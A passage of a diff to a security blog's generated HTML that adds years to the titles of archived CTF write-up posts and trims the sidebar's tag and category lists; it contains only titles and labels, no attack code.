+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >2018 0ctf-login me</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >pwnhub time injection带来的新思路</a>
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >2018 pwnhub time injection带来的新思路</a>
         </li>
     
     
@@ -5116,12 +5144,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018安恒一月月赛部分题解</a>
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018 安恒一月月赛部分题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >2018 XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
         </li>
     
     
@@ -5170,12 +5198,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >安恒12月赛之VSCMS审计</a>
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >2017 安恒12月赛之VSCMS审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >安恒杯-12月月赛</a>
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >2017 安恒杯-12月月赛</a>
         </li>
     
     
@@ -5185,7 +5213,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >pwnhub成功就是要梭哈之学习记录</a>
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >2017 pwnhub成功就是要梭哈之学习记录</a>
         </li>
     
     
@@ -5215,12 +5243,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >湖湘杯复赛web400</a>
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >2017 湖湘杯复赛web400</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >湖湘杯复赛web题解</a>
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >2017 湖湘杯复赛web题解</a>
         </li>
     
     
@@ -5240,32 +5268,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >hctf的3道web题题解</a>
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >2017 hctf的3道web题题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >上海赛的RSA研究</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >2017 上海赛的RSA研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >上海线上赛web题解</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >2017 上海线上赛web题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >XDCTF线下赛经历及感悟</a>
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >2017 XDCTF线下赛经历及感悟</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >安恒总决赛的一道代码审计</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >2017 安恒总决赛的一道代码审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >geekgame部分web题解</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >2017 geekgame部分web题解</a>
         </li>
     
     
@@ -5275,7 +5303,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >BDCTF第一轮初赛web题解</a>
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >2017 BDCTF第一轮初赛web题解</a>
         </li>
     
     
@@ -5320,7 +5348,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >Xman线下赛源码审计</a>
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >2017 Xman线下赛源码审计</a>
         </li>
     
     
@@ -5507,61 +5535,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
-    
-        <span class="sidebar-tag-name" data-tags="Flow-Analysis"><span class="iconfont-archer">&#xe606;</span>Flow-Analysis</span>
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
-        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
-    
-        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
-    
-        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
-    
-        <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
-    
-        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
-    
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
-    
-        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
-    
-        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
-    
-        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
-    
-        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
-    
-        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
-    
-        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
-    
-        <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
-        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
-    
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
-    
-        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
-    
-        <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
-    
-        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
-    
-        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
-    
-        <span class="sidebar-tag-name" data-tags="des"><span class="iconfont-archer">&#xe606;</span>des</span>
+        <span class="sidebar-tag-name" data-tags="others"><span class="iconfont-archer">&#xe606;</span>others</span>
     
         <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
+        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
+    
+        <span class="sidebar-tag-name" data-tags="ml"><span class="iconfont-archer">&#xe606;</span>ml</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -5600,19 +5586,13 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
-        <span class="sidebar-category-name" data-categories="Flow-Analysis"><span class="iconfont-archer">&#xe60a;</span>Flow-Analysis</span>
-    
         <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
-    
-        <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
     
         <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
+        <span class="sidebar-category-name" data-categories="others"><span class="iconfont-archer">&#xe60a;</span>others</span>
+    
         <span class="sidebar-category-name" data-categories="paper"><span class="iconfont-archer">&#xe60a;</span>paper</span>
-    
-        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
-    
-        <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
